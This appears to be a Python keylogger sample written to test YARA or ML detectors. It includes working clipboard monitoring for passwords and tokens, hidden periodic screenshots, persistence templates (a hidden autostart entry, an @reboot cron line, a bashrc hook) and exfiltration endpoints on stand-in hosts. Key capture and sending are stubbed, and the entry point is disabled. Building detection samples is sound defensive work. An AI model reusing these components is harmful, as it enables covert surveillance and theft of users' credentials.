#!/usr/bin/env python3
"""
Keylogger Simulation - TEST ONLY
DO NOT EXECUTE - For YARA/ML detection testing
"""

import os
import sys
import time
import threading
import json
import base64
from datetime import datetime
from pathlib import Path

# Exfiltration endpoints
EXFIL_ENDPOINTS = [
    "https://evil-server.onion/keys",
    "ftp://stolen-data.ru/upload",
    "smtp://mail.darkweb.onion"
]

LOG_FILE = "/tmp/.keylog.dat"
SCREENSHOT_DIR = "/tmp/.screens"
CLIPBOARD_LOG = "/tmp/.clipboard.dat"

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.running = True
        self.current_window = ""
        
    def _get_active_window(self):
        """Get currently focused window title"""
        try:
            import subprocess
            result = subprocess.run(
                ['xdotool', 'getactivewindow', 'getwindowname'],
                capture_output=True, text=True
            )
            return result.stdout.strip()
        except:
            return "Unknown"
    
    def _capture_keys(self):
        """Capture keyboard input using /dev/input"""
        # Would read from /dev/input/eventX
        # Parse key events and log them
        pass
    
    def _capture_clipboard(self):
        """Monitor clipboard for sensitive data"""
        try:
            import subprocess
            while self.running:
                result = subprocess.run(
                    ['xclip', '-selection', 'clipboard', '-o'],
                    capture_output=True, text=True
                )
                content = result.stdout
                
                # Check for sensitive patterns
                if self._is_sensitive(content):
                    self._log_clipboard(content)
                    
                time.sleep(1)
        except:
            pass
    
    def _is_sensitive(self, text):
        """Check if text contains sensitive data"""
        patterns = [
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
            r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',  # Credit card
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
            r'password|passwd|pwd|secret|token|api.?key',  # Keywords
        ]
        return any(p in text.lower() for p in ['password', 'secret', 'token'])
    
    def _log_clipboard(self, content):
        """Log clipboard content"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "type": "clipboard",
            "window": self._get_active_window(),
            "content": content[:500]
        }
        with open(CLIPBOARD_LOG, 'a') as f:
            f.write(json.dumps(entry) + '\n')
    
    def _take_screenshot(self):
        """Capture periodic screenshots"""
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
        while self.running:
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{SCREENSHOT_DIR}/screen_{timestamp}.png"
                os.system(f"import -window root {filename} 2>/dev/null")
                time.sleep(60)
            except:
                pass
    
    def _exfiltrate(self):
        """Send collected data to C2"""
        while self.running:
            try:
                # Read logged data
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        data = f.read()
                    
                    # Encode and send
                    encoded = base64.b64encode(data.encode()).decode()
                    # Would POST to exfil endpoint
                    
                    # Clear sent data
                    open(LOG_FILE, 'w').close()
                    
                time.sleep(300)  # Every 5 minutes
            except:
                pass
    
    def _install_persistence(self):
        """Create persistence mechanisms"""
        # Autostart entry
        autostart_dir = Path.home() / ".config/autostart"
        autostart_dir.mkdir(parents=True, exist_ok=True)
        
        desktop_entry = f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec=python3 {__file__}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
        
        # Cron job
        cron_entry = f"@reboot python3 {__file__} &>/dev/null &"
        
        # Bashrc hook
        bashrc_hook = f"\n(python3 {__file__} &>/dev/null &)\n"
    
    def start(self):
        """Start all keylogger components"""
        threads = [
            threading.Thread(target=self._capture_keys, daemon=True),
            threading.Thread(target=self._capture_clipboard, daemon=True),
            threading.Thread(target=self._take_screenshot, daemon=True),
            threading.Thread(target=self._exfiltrate, daemon=True),
        ]
        
        for t in threads:
            t.start()
        
        # Keep main thread alive
        while self.running:
            time.sleep(1)

if __name__ == "__main__":
    print("[!] KEYLOGGER SIMULATION - TEST FILE ONLY")
    print("[!] This file is for security testing purposes")
    # keylogger = Keylogger()
    # keylogger.start()
